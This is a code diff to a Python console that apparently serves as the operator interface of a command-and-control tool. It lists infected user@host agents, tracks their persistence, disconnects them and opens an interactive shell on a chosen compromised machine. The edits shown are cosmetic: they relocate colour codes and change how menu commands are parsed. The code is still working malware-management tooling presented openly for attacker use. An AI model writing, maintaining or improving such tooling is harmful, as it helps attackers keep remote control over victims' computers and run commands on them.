@@ -229,8 +229,8 @@ def getidfromhost(host):
     return auxid
 
 def listagents():
-    print(Color.F_Blue + "\nList of user@hosts infected" + Color.reset)
-    print(Color.F_Blue + " - ID / USER@HOST / LAST CONNECTION / STATUS / PERSISTENT" + Color.reset)
+    print("\nList of user@hosts infected")
+    print(" - ID / USER@HOST / LAST CONNECTION / STATUS / PERSISTENT")
     current_date = datetime.datetime.now()
     for agentid, userhost in agents.items():
         agentdate = agentsdate[userhost]
@@ -247,7 +247,7 @@ def listagents():
 def persistenceagents(action):
     global agentspersist
     if not action.split(" ")[2] in agents.values() and not action.split(" ")[2] in agents.keys():
-        host = input("Choose the user@host or ID you want to mark as persist: ")
+        host = input(Color.F_Blue + "Choose the user@host or ID you want to mark as persist: " + Color.reset)
         if not host in agents.values() and not host in agents.keys():
             print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
         else:
@@ -290,7 +290,7 @@ def cleanagents(action):
         agents = {}
     else:
         if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
-            host = input("Choose the user@host or ID you want to clean from list: ")
+            host = input(Color.F_Blue + "Choose the user@host or ID you want to clean from list: " + Color.reset)
             if not host in agents.values() and not host in agents.keys():
                 print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
             else:
@@ -318,7 +318,7 @@ def disconnectagents(action):
             agent = host
     else:
         if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
-            host = input("Choose the user@host or ID you want to disconnect from list: ")
+            host = input(Color.F_Blue + "Choose the user@host or ID you want to disconnect from list: " + Color.reset)
             if not host in agents.values() and not host in agents.keys():
                 print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
             else:
@@ -337,7 +337,7 @@ def interactagents(action):
     global agent
     notagent = False
     if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
-        host = input("Choose the user@host or ID you want to receive the shell: ")
+        host = input(Color.F_Blue + "Choose the user@host or ID you want to receive the shell: " + Color.reset)
         if not host in agents.values() and not host in agents.keys():
             print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
             notagent = True
@@ -369,7 +369,7 @@ def interactagents(action):
                 break
 
 def printmenu():
-    print(Color.F_Blue + """
+    print("""
 Select from the menu:
     1) List
     2) Interact <userhost or ID>
@@ -378,7 +378,7 @@ Select from the menu:
     5) Persistence <add or del> <userhost or ID> (Only mark if persistence have been done on host)
     6) Help (Print this message)
     7) Exit
-""" + Color.reset)
+""")
 
 def main():
 
@@ -436,8 +436,8 @@ def main():
         while True:
             global background
             background = False
-            action = input("Choose your action from menu: ")
-            if action == "list" or action == "List" or action == "1":
+            action = input(Color.F_Blue + "Choose your action from menu: " + Color.reset)
+            if action.split(" ")[0] == "list" or action.split(" ")[0] == "List" or action.split(" ")[0] == "1":
                 time.sleep(1)
                 listagents()
             if action.split(" ")[0] == "interact" or action.split(" ")[0] == "Interact" or action.split(" ")[0] == "2":
@@ -465,9 +465,9 @@ def main():
                     printmenu()
                 else:
                     persistenceagents(action)
-            if action == "help" or action == "Help" or action == "6":
+            if action.split(" ")[0] == "help" or action.split(" ")[0] == "Help" or action.split(" ")[0] == "6":
                 printmenu()
-            if action == "exit" or action == "Exit" or action == "7":
+            if action.split(" ")[0] == "exit" or action.split(" ")[0] == "Exit" or action.split(" ")[0] == "7":
                 server.socket.close()
                 print(Color.reset)
                 break
